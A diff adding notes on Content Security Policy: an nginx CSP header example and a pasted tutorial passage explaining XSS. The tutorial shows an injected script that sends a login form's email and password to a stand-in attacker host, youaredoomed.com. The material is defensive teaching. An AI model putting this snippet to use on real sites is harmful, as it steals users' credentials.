@@ -1,4 +1,92 @@
+#################
+#################
+https://packagist.org/packages/paragonie/csp-builder
+#################
+#################
+
+
+
+    add_header Content-Security-Policy "default-src 'none'; 
+                                        script-src 'self';
+                                        style-src 'self' ; 
+                                        connect-src 'self'; 
+                                        font-src 'self' https://fonts.googleapis.com; 
+                                        object-src 'self'; 
+                                        media-src 'self'; 
+                                        frame-src 'self' https://www.google.com https://www.youtube.com https://www.facebook.com;";
+
+Line breaks are tolerated by nginx conf parser, as long as it starts and ends with ". Machines don't mind but humans usually prefer readable configuration files
+
+
+#################
 ## this can also be done in a .htaccess file depending on your server set determines where you decide to set it
+#################
+
+
+#################
+#################
+
+https://www.baeldung.com/spring-security-csp
+
+#################
+#################
+
+
+2. Content Security Policy
+The Content Security Policy (CSP) is an HTTP response header that significantly reduces code-injection attacks like XSS, Clickjacking, etc., in modern browsers.
+
+A web server specifies an allowlist of resources that a browser can render with a Content-Security-Policy header. These resources could be anything that a browser renders, for instance, CSS, Javascript, images, etc.
+
+The syntax of this header is:
+
+
+freestar
+Content-Security-Policy: <directive>; <directive>; <directive> ; ...
+Besides, we can set this policy as part of an HTML page's <meta> tags:
+
+<meta http-equiv="Content-Security-Policy" content="<directive>;<directive>;<directive>; ...">
+Additionally, each of these directives contains a key with multiple values. There can be more than one directive, each separated by a semicolon (;):
+
+Content-Security-Policy: script-src 'self' https://baeldung.com; style-src 'self';
+In this case, we have two directives (script-src and style-src), and the directive script-src has two values (‘self' and https://baeldung.com).
+
+3. Vulnerability Demonstration
+Now, let's see an example of how serious the XSS and code injection vulnerabilities can be.
+
+3.1. Login Form
+Generally, we redirect the user to a login page on a session timeout in web applications. Also, a standard login form has username/password fields and a submit button:
+
+
+freestar
+<span> Session time out. Please login.</span>
+<form id="login" action="/login">
+    <input type="email" class="form-control" id="email">
+    <input type="password" class="form-control" id="password">
+    <button type="submit">Login</button>
+</form>
+3.2. Code Injection
+A user can inject suspicious code through form fields while providing user input. For example, assume a textbox that accepts usernames in a registration form.
+
+Instead of a username, a user can input <script>alert(“this is not expected”)</script> and submit the form. Subsequently, when the form displays the username, it executes the script (alerts a message in this case). The script can even load external scripts that can cause more serious harm.
+
+Similarly, let's assume we have form fields with insufficient validations. Again, a user exploits this and injects a malicious Javascript code into the DOM (Document Object Model):
+
+<span> Session time out. Please login.</span>
+<form id="login" action="/login">
+    <input type="email" class="form-control" id="email">
+    <input type="password" class="form-control" id="password">
+    <button type="submit">Login</button> 
+</form>
+<script>
+    let form= document.forms.login;
+    form.action="https://youaredoomed.com:9090/collect?u="+document.getElementById('email').value
+      +"&p="+document.getElementById('password').value;
+</script>
+This injected Javascript code redirects the users to a malicious site when clicking on a Login button.
+
+When an unsuspecting user submits the form, he gets redirected to https://youaredoomed.com with his credentials exposed.
+
+#################
 #################
 
 Header unset Content-Security-Policy
